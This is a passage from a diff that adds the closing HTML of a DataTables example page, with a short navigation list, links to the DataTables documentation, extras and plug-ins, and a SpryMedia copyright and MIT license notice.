+							<li><a href="./pdf_message.html">PDF message</a></li>
+							<li><a href="./jqueryui.html">jQuery UI styling</a></li>
+						</ul>
+					</div>
+				</div>
+
+				<div class="epilogue">
+					<p>Please refer to the <a href="http://www.datatables.net">DataTables documentation</a> for full
+					information about its API properties and methods.<br>
+					Additionally, there are a wide range of <a href="http://www.datatables.net/extras">extras</a> and
+					<a href="http://www.datatables.net/plug-ins">plug-ins</a> which extend the capabilities of
+					DataTables.</p>
+
+					<p class="copyright">DataTables designed and created by <a href=
+					"http://www.sprymedia.co.uk">SpryMedia Ltd</a> &#169; 2007-2014<br>
+					DataTables is licensed under the <a href="http://www.datatables.net/mit">MIT license</a>.</p>
+				</div>
+			</div>
+		</div>
+	</section>
+</body>
+</html>
